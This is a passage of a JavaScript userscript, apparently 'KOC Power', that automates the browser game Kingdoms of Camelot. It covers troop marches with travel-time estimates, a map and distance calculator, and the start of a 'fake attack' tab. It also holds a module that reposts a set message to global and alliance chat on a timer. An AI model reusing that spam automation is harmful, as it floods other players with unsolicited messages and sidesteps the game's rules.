	                   for(i = 0; i <= unitsarr.length; i++){
	                   	if(params["u"+i]){
	                  	unitsarr[i] = params["u"+i];
	                  	}
	                   }
	                   var resources=new Array();
	                   resources[0] = params.gold;
	                   for(i=1; i<=5; i++){
	                  	resources[i] = params["r"+i];
	                   }
	                   var currentcityid =  t.sourceCity.id;
	                   unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
	                   unsafeWindow.update_seed(rslt.updateSeed)
	                   if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
	                   
	                   for(var i=0;i<iused.length;i++){
			    Seed.items["i"+iused[i]]=parseInt(Seed.items["i"+iused[i]])-1;unsafeWindow.ksoItems[iused[i]].subtract();
			   }		
	                   if (typemarche==2) var typeattaque="<span class=boldGreen>"+culang.MTreinforceok+"</span>"; 
	                   if (typemarche==4) var typeattaque="<span class=boldGreen>"+culang.MTattackok+"</span>"; 
	                   if (typemarche==3) var typeattaque="<span class=boldGreen>"+culang.MTscoutok+"</span>"; 
     	 		   t.statutRAA.innerHTML = "<center><font size='3px'><b>"+typeattaque+"</b></font></center>";
	                   t.actionRAA.disabled=false;
	                   t.actionREE.disabled=false;
      			   t.actionREN.disabled=false;	
      			   t.clickRAACitySourceSelect(t.sourceCity);
	                  } else {
			    t.statutRAA.innerHTML ="<font color=red size='3px'><b>"+culang.MTerror+"<b></font>";
			     if (rslt.msg) {
			       t.statutRAA.innerHTML +="<br><font color=black size='2px'>" + rslt.msg +"</font>";
	         	     
	                     t.actionRAA.disabled=false;
      			     t.actionREN.disabled=false;
      			     t.actionREE.disabled=false;
      			     }else{
      			      t.statutRAA.innerHTML +="<br>"+culang.actionBuild11+"</font>";
         	     	      setTimeout(function() { t.clickATTAQUEDo(); }, 2000);
      			     }
	                  }
	                  },
	                  onFailure: function () {
	                    var t = Tabs.Reinforce;
	                    t.statutRAA.innerHTML ="<font color=red size='3px'><b>"+culang.MTerror+"<b></font>";
	                    t.actionRAA.disabled=false;
      			    t.actionREN.disabled=false;
      			    t.actionREE.disabled=false;
	                  }
	          });
            
  
    },
  
    estimerRes: function() {
     var t = Tabs.Reinforce;
     // CAlcul de ETA = Estimation du temps de marches
     var x1 = parseInt(t.sourceCity.x);
     var x2 = parseInt(t.destinationCityx.value);
     var y1 = parseInt(t.sourceCity.y);
     var y2 = parseInt(t.destinationCityy.value);
     var dist = distance (x1, y1, x2, y2);
     document.getElementById("BOEstimationD").innerHTML = '<b>' + dist + '</b>&nbsp;'+pdxkoordlink(t.destinationCityx.value,t.destinationCityy.value)+' ';     
     for (r=1; r<13; r++){
        var m = t.estETA(dist, r);
        document.getElementById("BOEstimationTT"+r).innerHTML = "<b>" + m.etaStr + "</b>";
        document.getElementById("BOEstimationTZ"+r).innerHTML = "<b>" + m.friendEtaStr + "</b>";
     }
    var closestDist=999999;
	var closestLoc=null;
	var closestNum=1;
	for (var c=0; c<Cities.numCities; c++){
	var city = Cities.cities[c];
	var dist=distance(city.x,city.y,x2,y2);
	if(dist<closestDist) {
	 closestDist=dist;
	 closestLoc=city.x +','+ city.y;
	 closestNum=c+1;
	}
	}
	document.getElementById("nextNearCity").innerHTML='<input type="submit" value="'+closestNum+'" class="castleBut castleButNon">'		
    },
    SelectFavoris:function() {
      var t = Tabs.Reinforce;
      if (t.listeFavoris.value!='') {
       var valeur=t.listeFavoris.value;
       var x=valeur.substr(0, valeur.lastIndexOf(','));
       var y=valeur.substr(valeur.lastIndexOf(',')+1, valeur.length);
       t.destinationCityx.value = x;
       t.destinationCityy.value = y;
      }
      t.estimerRes();
     },
     estETA : function(dist, unit) { // Need Relief Station Levels to estimate transport, reinf, or reassign times. 
             var t = Tabs.Reinforce;
             var ret={ETA:0,etaStr:''+culang.notAval+'',friendETA:0,friendEtaStr:''+culang.notAval+''};    
             var cityID;
             if (dist <= 0) return ret;
             
             var EtaType = unit;
             if (EtaType==1) var baseSpeedSel="0,180";
             if (EtaType==2) var baseSpeedSel="0,200";
             if (EtaType==3) var baseSpeedSel="0,3000";
             if (EtaType==4) var baseSpeedSel="0,300";
             if (EtaType==5) var baseSpeedSel="0,275";
             if (EtaType==6) var baseSpeedSel="0,250";
             if (EtaType==7) var baseSpeedSel="1,1000";
             if (EtaType==8) var baseSpeedSel="1,750";
             if (EtaType==9) var baseSpeedSel="1,150";
             if (EtaType==10) var baseSpeedSel="1,100";
             if (EtaType==11) var baseSpeedSel="1,120";
             if (EtaType==12) var baseSpeedSel="1,80";

             var m = baseSpeedSel.split(',');
             var horse = 0;
             var baseSpeed = 0;
             if(m) {
               horse = parseInt(m[0]);
               baseSpeed = parseInt(m[1]);
             }
             if (baseSpeed == 0) return ret;
             var mmLvl = parseInt(Seed.tech.tch11);//Magical Mapping
             var Speed = 0;
             if (horse){ //HorsesSiegeSpeed = Base * (1 + MM/10) * (1 + AH/20) 
               var hsLvl = parseInt(Seed.tech.tch12);//Alloy Horse Shoes
               Speed = baseSpeed * (1 + mmLvl/10.0) * (1 + hsLvl/20.0);
             }
             else { //FootSpeed = Base * (1 + MM/10)
               Speed = baseSpeed * (1 + mmLvl/10.0);
             } //Grid Speed (tiles/second) = Speed (100ths/min) / 6000 
             var gSpeed = 0;
             var estSec;
             if (Speed>0) {
               gSpeed = Speed/6000.0;//0.48333 mm=10, hs=9
               estSec = (parseFloat(dist)/gSpeed).toFixed(0);
             }
             var e=1;
             var l_elem=document.getElementById("BOitem_55");
	     if(l_elem&&l_elem.checked>0){ e=0.75;     }
	     var l_elem=document.getElementById("BOitem_57");
	     if(l_elem&&l_elem.checked){   e=0.5;           }
             
             
             ret.ETA = (parseInt((estSec*e+''))+30); 
             ret.etaStr = timestr (ret.ETA,1);
        
             cityID = t.sourceCity.id;
             var building = getCityBuilding (cityID, 18);
             if (building) {
                 fSpeed = Speed * (1 + parseInt(building.maxLevel)/2);
                 gSpeed = fSpeed/6000;
                 estSec = (dist/gSpeed).toFixed(0);
                 ret.friendETA = parseInt((estSec*e+''))+30; 
                 ret.friendEtaStr = timestr ((ret.friendETA+''),1);
     
             }
             return ret;
     },
     chercherFavoris: function() {
      var t = Tabs.Reinforce;
      var myA = getMyAlliance ();
      if (myA[0]!=0) {
         var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
         params.perPage = 100;
         params.allianceId = myA[0];
             new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserLeaderboard.php" + unsafeWindow.g_ajaxsuffix, {
   	        method: "post",
   	        parameters: params,
   	        onSuccess: function (rslt) {
   	          //t.listeFavoris.innerHTML=null;
   	          if (rslt.ok){
   	           var z=0;
   	           var m="";
   	           for (var i=0; i<rslt.results.length; i++){
        		      p = rslt.results[i];
   		      if (p.userId != 0){
   		       for (var c=0; c<p.cities.length; c++){
   		         if (Seed.player.name!=p.displayName) {
   		          m += "<option value='" + p.cities[c].xCoord + ","+ p.cities[c].yCoord+"'>" + p.displayName + "  - "+culang.city+" " + (c+1) + " - " + p.cities[c].xCoord + "," + p.cities[c].yCoord+"</option>";
   		         }
   		       }  //finish for cities  	       
   		      }   //finish if user 
         	            } //finish for resultat
         	    t.listeFavoris.innerHTML="<option value=''>"+culang.select+"</option>"+m;
   	          }// finish
   	        },
   	        onFailure: function (rslt) {
   	          t.listeFavoris.innerHTML="<option>"+culang.error+"</option>";
   	        },
       	});
             
      } else {// no alliance !
        t.listeFavoris.innerHTML="<option>"+culang.MTnoalliance+"</option>";
      }
         
  },
   SaveCoordsOptions: function(x,y) {
       Options.Xrenfort = x;
       Options.Yrenfort = y;
       saveOptions ();
  },
   
  clickRAACitySourceSelect : function (city){
     var t = Tabs.Reinforce;
    
     if (t.sourceCity!=city) {
      t.sourceCity = city; 
     }
     var m="";
     m="<table cellspacing=0 cellpadding=0 width=80%><tr><td colspan=2><b><u>"+culang.units+"</b></u></tr>";
     var cityID = 'city'+ t.sourceCity.id;
     for (r=1; r<13; r++){   
       m += '<tr><td align=right><img title="'+unsafeWindow.unitcost['unt'+r][0]+'" height=20 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_'+r+'_50_s34.jpg></td>\
             <td align=left><input style="border:1px solid black;height:16px;font-size:11px;" id="RAAdestunit'+r+'" type=text size=7 readonly value="'+parseInt(Seed.units[cityID]['unt'+r])+'">&nbsp;\
             <input type=button value="->" id="RAApdestunit'+r+'"  style="border:1px solid black;height:16px;font-size:11px;"></td></tr>';
     }
     m += "</table>";
     document.getElementById("RAAstatsource").innerHTML = m;
        var knt = new Array();
        for (k in Seed.knights['city' + t.sourceCity.id]){
               		if (Seed.knights['city' + t.sourceCity.id][k]["knightStatus"] == 1 && Seed.leaders['city' + t.sourceCity.id]["resourcefulnessKnightId"] != Seed.knights['city' + t.sourceCity.id][k]["knightId"] && Seed.leaders['city' + t.sourceCity.id]["politicsKnightId"] != Seed.knights['city' + t.sourceCity.id][k]["knightId"] && Seed.leaders['city' + t.sourceCity.id]["combatKnightId"] != Seed.knights['city' + t.sourceCity.id][k]["knightId"] && Seed.leaders['city' + t.sourceCity.id]["intelligenceKnightId"] != Seed.knights['city' + t.sourceCity.id][k]["knightId"]){
               			knt.push ({
               				Name:   Seed.knights['city' + t.sourceCity.id][k]["knightName"],
               				Combat:	Seed.knights['city' + t.sourceCity.id][k]["combat"],
               				ID:	Seed.knights['city' + t.sourceCity.id][k]["knightId"],
               			});
               		}
               }
               knt = knt.sort(function sort(a,b) {a = parseInt(a['Combat']);b = parseInt(b['Combat']);return a == b ? 0 : (a > b ? -1 : 1);}); 
               document.getElementById('RAApiKnight').options.length=0;
               var o = document.createElement("option");
     	       o.text = "-- "+culang.selKnight+" --"
     	       o.value = 0;
               document.getElementById("RAApiKnight").options.add(o);
               for (k in knt){
            			if (knt[k]["Name"] !=undefined){
        	    			var o = document.createElement("option");
        	    			o.text = (knt[k]["Name"] + ' (' + knt[k]["Combat"] +')')
        	    			o.value = knt[k]["ID"];
        	    			document.getElementById("RAApiKnight").options.add(o);
            			}
         }
     
      if (document.getElementById('RAApiKnight').options.length>0) {
       document.getElementById('RAApiKnight').selectedIndex=1;
      } 
      
      var itemlist=[55,57,931,932];
      for(var i=0;i<itemlist.length;i++){
        document.getElementById('BOitemSpan_'+itemlist[i]).innerHTML = unsafeWindow.ksoItems[itemlist[i]].count;
      }
     for (r=1; r<13; r++){
       document.getElementById("RAApdestunit"+r).addEventListener ('click', function() {
         var nomcha=this.id.replace("RAApdest","RAAdest");
         var nomcha2=this.id.replace("RAApdestunit","RAAnbunit");
         document.getElementById(nomcha2).value=0; // on met ? 0
         var e=1;
         var f=unsafeWindow.unixtime();
         if(Seed.playerEffects.aurasExpire){if(Seed.playerEffects.aurasExpire>f){e=1.15}}
	 if(Seed.playerEffects.auras2Expire){if(Seed.playerEffects.auras2Expire>f){e=1.3}}

         var l_elem=document.getElementById("BOitem_931");
	 if(l_elem&&l_elem.checked&&parseInt(Seed.items["i931"])>0){	        e+=0.25;	 }
	 var l_elem=document.getElementById("BOitem_932");
	 if(l_elem&&l_elem.checked&&parseInt(Seed.items["i932"])>0){	        e+=0.5;     }

         var niveauPointRall=parseInt(getCityBuilding (t.sourceCity.id, 12).maxLevel); // 12=Point de ralliement
         var maxtroupe=parseInt(niveauPointRall*10000*e);
         if (niveauPointRall==11) maxtroupe=parseInt(150000*e);
         if (niveauPointRall==12) maxtroupe=parseInt(200000*e);
         var nbunitto=0;
         for (r=1; r<13; r++) {
           nbunitto+=parseInt(document.getElementById("RAAnbunit"+r).value);
	 }
         var libre = parseInt(maxtroupe - nbunitto);
         if (document.getElementById(nomcha).value>=libre) {
           document.getElementById(nomcha2).value = libre;
         }  else {
           document.getElementById(nomcha2).value= document.getElementById(nomcha).value;
         }
        }, false);
     }
     if (t.sourceCity!=city) {
           for (r=1; r<13; r++){
            document.getElementById("RAAnbunit"+r).value="0";
           }
     } else {
          
          for (r=1; r<13; r++){
              if (document.getElementById("RAAnbunit"+r).value=="") document.getElementById("RAAnbunit"+r).value="0";
              if (document.getElementById("RAAdestunit"+r).value=="") document.getElementById("RAAdestunit"+r).value="0";
                if (parseInt(document.getElementById("RAAnbunit"+r).value)>parseInt(document.getElementById("RAAdestunit"+r).value)) {
                 document.getElementById("RAAnbunit"+r).value="0";
                }
           }
     }
     t.estimerRes();
   },
 
}
/***********************************************************************************/
/************ KOC POWER - TABS SPAM ***********************************************/
/*********************************************************************************/
Tabs.Spam = {
 tabLabel : culang.spam,
 tabOrder : StyleOptions.toSpam,
 tabDisabled : StyleOptions.disSpamTab, 
  myDiv : null,
  timer : null,  
  
  init : function (div){    // called once, upon script startup
  var t = Tabs.Spam;
  t.myDiv = div;
  
  var m = '<table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td class="pdxStat" width="700"> '+culang.HglobalCht+'</td></tr></table>';
  m += '<td width="100%" colspan="2"><INPUT id=pbSpamEnable type=checkbox '+ (Options.spamconfig.aspam?' CHECKED':'') +'/> '+culang.STglobalchat+'</td>';
  m += '<TD><INPUT id=pbSpamMin type=text size=2 maxlength=3 value="'+ Options.spamconfig.spammins +'" \> '+culang.STpostmin+'</td><br>';
  m += '</tr><tr><td colspan="2"><b>'+culang.message+':</b> &nbsp; </td>\
    <TD><center><INPUT id=pbSpamAd type=text size=100 maxlength=800 value="'+ Options.spamconfig.spamvert +'" \></center></td></tr></table>\
  <table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td class="pdxStat" width="700"> '+culang.HallyCht+'</td></tr></table>\
  <td width="100%" colspan="2"><INPUT id=pbSpamEinschaltenA type=checkbox '+ (Options.spamconfiga.aspama?' CHECKED':'') +'/> '+culang.STalliancechat+'</td>\
  <TD><INPUT id=pbSpamMinutenA type=text size=2 maxlength=3 value="'+ Options.spamconfiga.spamminsa +'" \> '+culang.STpostmin+'</td><br>\
  </tr><tr><td colspan="2"><b>'+culang.message+':</b> &nbsp; </td>\
  <TD><center><INPUT id=pbSpamNachrichtA type=text size=100 maxlength=800 value="'+ Options.spamconfiga.spamverta +'" \></center></td></tr></table>';
  t.myDiv.innerHTML = m;

  document.getElementById('pbSpamEnable').addEventListener ('change', t.e_spamOptChanged, false);
  document.getElementById('pbSpamAd').addEventListener ('change', t.e_spamOptChanged, false);
  document.getElementById('pbSpamMin').addEventListener ('change', t.e_spamOptChanged, false);
  document.getElementById('pbSpamEinschaltenA').addEventListener ('change', t.e_spamOptChanged, false);
  document.getElementById('pbSpamNachrichtA').addEventListener ('change', t.e_spamOptChanged, false);
  document.getElementById('pbSpamMinutenA').addEventListener ('change', t.e_spamOptChanged, false);
},
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
  var t = Tabs.Spam;
   mainPop.div.style.width = 750 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  
  show : function (){         // called whenever this tab is shown
  var t = Tabs.Spam;
   mainPop.div.style.width = 750 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  e_spamOptChanged : function (){
  var t = Tabs.Spam;
  Options.spamconfig.aspam = document.getElementById('pbSpamEnable').checked;
  Options.spamconfig.spamvert = document.getElementById('pbSpamAd').value;
  Options.spamconfig.spammins = document.getElementById('pbSpamMin').value;
  Options.spamconfiga.aspama = document.getElementById('pbSpamEinschaltenA').checked;
  Options.spamconfiga.spamverta = document.getElementById('pbSpamNachrichtA').value;
  Options.spamconfiga.spamminsa = document.getElementById('pbSpamMinutenA').value;
  },

};  

var SpamEvery  = {
  timer : null,
  init : function (){

  if (Options.spamconfig.spammins < 1)
    Options.spamconfig.spammins = 1;
  SpamEvery.setEnable (Options.spamconfig.aspam);
  },
  setEnable : function (tf){
  var t = SpamEvery;
  clearTimeout (t.timer);
  if (tf)
    t.timer = setTimeout (t.count, '60000');
  },
  count : function (){
   var t = SpamEvery;
   if (Options.spamconfig.atime > Options.spamconfig.spammins) {
  Options.spamconfig.atime = 2;
  t.doit ();
   } else {
  Options.spamconfig.atime = (Options.spamconfig.atime + 1);
  SpamEvery.init ();
   }
  },
  doit : function (){
  actionLog ('<b>'+culang.actionGlobalSpam+'</b>: ('+ Options.spamconfig.spammins +' '+culang.actionGlobalSpam2+') '+culang.actionGlobalSpam3+'');
  sendChat ("/g "+culang.actionSpam4+": "+  Options.spamconfig.spamvert);
  SpamEvery.init ();
  }
}
var SpamEveryA  = {
  timer : null,

  init : function (){

  if (Options.spamconfiga.spamminsa < 1)
    Options.spamconfiga.spamminsa = 1;
  SpamEveryA.setEnableA (Options.spamconfiga.aspama);

  },
  setEnableA : function (tf){
  var t = SpamEveryA;
  clearTimeout (t.timer);
  if (tf)
    t.timer = setTimeout (t.count, '60000');
  },
  count : function (){
   var t = SpamEveryA;
   if (Options.spamconfiga.atimea > Options.spamconfiga.spamminsa) {
  Options.spamconfiga.atimea = 2;
  t.doit ();
   } else {
  Options.spamconfiga.atimea = (Options.spamconfiga.atimea + 1);
  SpamEveryA.init ();
   }
  },
  doit : function (){
  actionLog ('<b>'+culang.auto+' '+culang.alliance+' '+culang.actionSpam +'</b> ('+ Options.spamconfiga.spamminsa +' '+culang.actionSpam2+') '+culang.actionSpam3+'');
  sendChat ("/a "+culang.actionSpam4+": "+  Options.spamconfiga.spamverta);
  SpamEveryA.init ();
  }
}    
/***********************************************************************************/
/************ KOC POWER - TABS MAP ************************************************/
/*********************************************************************************/
Tabs.Karte = {
	tabOrder:	StyleOptions.toInfo,
	tabLabel:	culang.info,
	cont:			null,

	init: function (div){
		var t = Tabs.Karte;
		t.cont = div;
		fortmight = {u53: "4", u55: "7", u60: "1", u61: "2", u62: "3", };
		var t = Tabs.Karte;
		rownum = 0;
		m = '<STYLE>.xtabH {background:#ffffe8; border:none; padding-right: 5px; padding-left: 5px; margin-left:10px; }			.xtabHL { background:#ffffe8; border-width: 1px; border-style: none none none solid; padding-right:5px; padding-left:5px; margin-left:10px; }			.xtabL { background:none; border-width: 1px; border-style: none none none solid; padding-right:5px; padding-left: 5px; margin-left:10px; }			.xtabLine { padding:0px; spacing:0px; height:1px; border-color:black; border-width: 1px; border-style: none none solid none }</style>\
			<DIV style="height:650px; max-height:650px; overflow-y:auto; overflow-x:auto">';

		m += '<DIV class=pdxStat>'+culang.Hdistcal+'</div><DIV class=pdxEntry><TABLE align=center cellpadding=1 cellspacing=0>		<TR><TD class=xtab align=left><INPUT id=plot type=checkbox>'+culang.OplotSpots+'</td></tr>		<TR><TD class=xtab align=right><B>'+culang.startpoint+': </b></td><TD  class=xtab> X: <INPUT id=calcX type=text\> Y: <INPUT id=calcY type=text\> <SPAN id=ptloc1></span></td></tr>\
		<TR><TD class=xtab align=right><B>'+culang.target+': </b></td><TD class=xtab> X: <INPUT id=calcX2 type=text\> Y: <INPUT id=calcY2 type=text\> <SPAN id=ptloc2></span></td></tr></table>\
		<CENTER><DIV style="width:60%; font-size:14px; border: 1px solid; background-color:white; margin:20px 3px 3px 0px; padding:4px" id=ptdistout></div>\
		<div><br><b>'+culang.MTtimefor+'</b><br><select id="idETASelect">		<option value="0,250" > -- '+culang.select+' -- </option>		<option value="0,180" > '+culang.supplytroop+' </option>		<option value="0,200" > '+culang.militiaman+' </option>		<option value="0,3000" > '+culang.scout+' </option>		<option value="0,300" > '+culang.pikeman+' </option>		<option value="0,275" > '+culang.swordsman+' </option>		<option value="0,250" > '+culang.archer+' </option>		<option value="1,1000" > '+culang.cavalry+' </option>		<option value="1,750" > '+culang.heavycavalry+' </option>		<option value="1,150" > '+culang.supplywagon+' </option>		<option value="1,100" > '+culang.ballista+' </option>		<option value="1,120" > '+culang.batteringram+' </option>		<option value="1,80" > '+culang.catapult+' </option>\
		</select><BR><BR><SPAN class=boldRed>('+culang.startpoint+', '+culang.target+' '+culang.MTandsel+'!)</span></div>		<DIV style="width:60%; font-size:14px; border: 1px solid; background-color:white; margin:20px 3px 3px 0px; padding:4px" id=ptETAout></div>		'+culang.eta+' = '+culang.PTEtanote+'</center></div>';
		m += '<DIV class=pdxStat>'+culang.HprovMap+'</div><DIV id=ptProvMap style="height:'+ provMapCoords.imgHeight +'px; width:'+ provMapCoords.imgWidth +'px; background-repeat:no-repeat; background-image:url(\''+ URL_PROVINCE_MAP +'\')"></div>';

		t.cont.innerHTML = m +'</div>';
   for (var c=0; c<Cities.numCities; c++)      
      t.makeCityImg (c, document.getElementById('ptProvMap'));
	new CdispCityPicker ('ptloc1', document.getElementById('ptloc1'), true, t.eventLocChanged, 0).bindToXYboxes(document.getElementById('calcX'), document.getElementById('calcY'));   
	new CdispCityPicker ('ptloc2', document.getElementById('ptloc2'), true, t.eventLocChanged, 0).bindToXYboxes(document.getElementById('calcX2'), document.getElementById('calcY2'));
	t.eventLocChanged(Cities.cities[0], Cities.cities[0].x, Cities.cities[0].y);
    t.eventFromLocChanged(Cities.cities[0], Cities.cities[0].x, Cities.cities[0].y);
    document.getElementById('idETASelect').addEventListener ( 'change', t.eventLocChanged, false);
	document.getElementById('plot').addEventListener('change', function(){
	t.plotCityImg(0, document.getElementById('ptProvMap'), document.getElementById('calcX').value, document.getElementById('calcY').value);
	t.plotCityImg(1, document.getElementById('ptProvMap'), document.getElementById('calcX2').value, document.getElementById('calcY2').value);
    }, false);
	},

	hide: function (){
	var t = Tabs.Karte;
	    mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
	},

	show: function (){
	var t = Tabs.Karte;
	mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
		function rlShow(rl) {
			var retval = '<TD><B>'+rl.Name+'</B></TD><TD align=right><B>&nbsp;&nbsp;';
			if (rl.NextLevelETA > 0)
				nlETA = '(' + (rl.Level + 1) + ': ' + timestr(rl.NextLevelETA) + ')';
			else
				nlETA = '';
			if (rl.Level < 9)
				retval += '<SPAN class=boldRed>' + rl.Level + '</SPAN></B></TD><TD nowrap>&nbsp;&nbsp;' + nlETA + '</TD>';
			else
				retval += rl.Level + '</B></TD><TD nowrap>&nbsp;&nbsp;' + nlETA + '</TD>';
			return retval;
		};
		
	},

	makeCityImg: function (cityNum, eMap){
		var t = Tabs.Karte;
		var city = Cities.cities[cityNum];
		var x = parseInt((provMapCoords.mapWidth * city.x) / 750);
		var y = parseInt((provMapCoords.mapHeight * city.y) / 750);
		var ce = document.createElement ('div');
		ce.style.background = '#700';
		ce.style.opacity = '1.0';
		ce.style.position='relative';
		ce.style.display='block';
		ce.style.width='14px';
		ce.style.height='16px';
		ce.style.border='1px solid #fff';
		ce.style.color = 'white';
		ce.style.textAlign = 'center';
		ce.style.top = (y+provMapCoords.topMargin-(cityNum*18)-8) +'px';
		ce.style.left = (x+provMapCoords.leftMargin-7) +'px';
		eMap.appendChild(ce);
		ce.innerHTML = (cityNum+1) +'';
	},

	plotCityImg: function (cityNum, eMap, x, y){
		var t = Tabs.Karte;
		var xplot = parseInt((provMapCoords.mapWidth * x) / 750);
		var yplot = parseInt((provMapCoords.mapHeight * y) / 750);
		if(document.getElementById('plotmap_'+cityNum) == null){
			var ce = document.createElement ('div');
			ce.style.background = 'white';
			ce.id = 'plotmap_'+cityNum;
			ce.style.opacity = '1.0';
			ce.style.position='relative';
			ce.style.display='block';
			ce.style.width='14px';
			ce.style.height='16px';
			ce.style.border='1px solid #fff';
			ce.style.color = 'black';
			ce.style.textAlign = 'center';
		} else
			ce = document.getElementById('plotmap_'+cityNum);
		ce.style.top = (yplot+provMapCoords.topMargin-((Cities.numCities+cityNum)*18)-8) +'px';
		ce.style.left = (xplot+provMapCoords.leftMargin-7) +'px';
		eMap.appendChild(ce);
		ce.innerHTML = (cityNum+1) +'';
	},

eventLocChanged : function (city, x, y){
    var t = Tabs.Karte;
    var x1 = parseInt(document.getElementById('calcX').value);
    var x2 = parseInt(document.getElementById('calcX2').value);
    if (isNaN(x2))
      return;
    var y1 = parseInt(document.getElementById('calcY').value);
    var y2 = parseInt(document.getElementById('calcY2').value);
    var m = ''+culang.distance+' '+culang.from+' '+ x1 +','+ y1 +' '+culang.to+' '+ x2 +','+ y2 +' '+culang.is+': &nbsp;<B>'+ distance (x1, y1, x2, y2).toFixed(2) +'</b>';
    document.getElementById('ptdistout').innerHTML = m;
	if (document.getElementById('plot').checked){
	t.plotCityImg(0, document.getElementById('ptProvMap'), x1, y1);
	t.plotCityImg(1, document.getElementById('ptProvMap'), x2, y2);
	}
    var dist = distance (x1, y1, x2, y2);
    m = t.estETA(dist);
    if (m != null)
       document.getElementById('ptETAout').innerHTML = m;
    else logit("no M");
  },

  eventFromLocChanged : function (city, x, y){
    var t = Tabs.Karte;
    t.ModelCity = city;
    var x1 = parseInt(document.getElementById('calcX').value);
    var x2 = parseInt(document.getElementById('calcX2').value);
    if (isNaN(x2))
      return;
    var y1 = parseInt(document.getElementById('calcY').value);
    var y2 = parseInt(document.getElementById('calcY2').value);
    var m = ''+culang.distance+' '+culang.from+' '+ x1 +','+ y1 +' '+culang.to+' '+ x2 +','+ y2 +' '+culang.is+': &nbsp;<B>'+ distance (x1, y1, x2, y2).toFixed(2) +'</b>';
    document.getElementById('ptdistout').innerHTML = m;
    var dist = distance (x1, y1, x2, y2);
    m = t.estETA(dist);
    if (m != null)
       document.getElementById('ptETAout').innerHTML = m;
    else logit("no M");
  },
	estETA : function(dist) { // Need Relief Station Levels to estimate transport, reinf, or reassign times.
    var t = Tabs.Karte;
    var cityID;
    if (dist == 0) return ""+culang.MTnotime+"!";
    var EtaType = document.getElementById('idETASelect');
    var baseSpeedSel = EtaType.options[EtaType.selectedIndex].value;
    var m = baseSpeedSel.split(',');
    var horse = parseInt(m[0]);
    var baseSpeed = parseInt(m[1]);
    if (baseSpeed == 0) return ""+culang.eta+": "+culang.botStatUnknown+"";
    var mmLvl = parseInt(Seed.tech.tch11);//Magical Mapping
    var Speed = 0;
    if (horse){
    //HorsesSiegeSpeed = Base * (1 + MM/10) * (1 + AH/20)
      var hsLvl = parseInt(Seed.tech.tch12);//Alloy Horse Shoes
      Speed = baseSpeed * (1 + mmLvl/10) * (1 + hsLvl/20);
    }
    else {
    //FootSpeed = Base * (1 + MM/10)
      Speed = baseSpeed * (1 + mmLvl/10);
    }
    //Grid Speed (tiles/second) = Speed (100ths/min) / 6000
    var gSpeed = 0;
    var estSec = 0;
    if (Speed>0) {
      gSpeed = Speed/6000;
      estSec = (dist/gSpeed).toFixed(0);
    }
    var ETAstr = ''+culang.rptattack+':  <B>' + timestr ((parseInt((estSec+''))+30)+'',1) +'</b>';
    //RS - Cities Relief Station Level
    //Friendly Speed = Speed * (1 + RS/2)
    if (t.ModelCity) {
      cityID = t.ModelCity.id;
      //logit ('ETAest - cityID: ' + cityID);
      var building = getCityBuilding (cityID, 18);
      if (building) {
        //logit ('ETAest - building: ' + building.count + ' : ' + building.maxLevel);
        fSpeed = Speed * (1 + parseInt(building.maxLevel)/2);
        gSpeed = fSpeed/6000;
        estSec = (dist/gSpeed).toFixed(0);
        var friendTimestr = '| '+culang.allied+': <B>' + timestr ((parseInt((estSec+''))+30)) +'</b>';
        ETAstr = ETAstr + ' ' + friendTimestr;
      }
    }
    return ETAstr;
  },

}

function CMapAjax (){
  this.normalize = normalize;  
  this.request = request;

  function request (left, top, width, notify){    
    var left = parseInt(left / 5) * 5;
    var top = parseInt(top / 5) * 5;
    var width = parseInt((width+4) / 5) * 5;
    
    var blockString = generateBlockList(left, top, width);
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.blocks = blockString;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/fetchMapTiles.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify(left, top, width, rslt);
      },
      onFailure: function (rslt) {
        notify(left, top, width, rslt);
      }
    });
    function generateBlockList (left, top, width) {
      var width5 = parseInt(width / 5);
      var bl = [];
      for (x=0; x<width5; x++){
        var xx = left + (x*5);
        if (xx > 745)
          xx -= 750;
        for (y=0; y<width5; y++){
          var yy = top + (y*5);
          if (yy > 745)
            yy -= 750;
          bl.push ('bl_'+ xx +'_bt_'+ yy);
        }
      }
      return bl.join(",");
    }
  }
 
  function normalize  (x){
    if ( x >= 750)
      x -= 750;
    else if (x < 0)
      x += 750;
    return parseInt (x/5) * 5;
  }
}
/***********************************************************************************/
/************ KOC POWER - TABS FAKE ATTACK ****************************************/
/*********************************************************************************/
Tabs.F = {
  tabLabel : culang.fake,
  tabOrder : StyleOptions.toFake,
  tabDisabled : StyleOptions.disFakeTab,
  cont : null,

  init : function (div){
	//t.checktourney();
    var t = Tabs.F;
    t.cont = div;
	var citySelect = '  <SELECT id=fakeCity>';
      for (var c=0; c<Cities.numCities; c++) {
        aCity = Cities.cities[c].name + ' ('+Cities.cities[c].x + ','+ Cities.cities[c].y+')';
           citySelect += '<option value=\''+c+'\'>'+aCity+'</option>';
      }
      citySelect += '</select>';
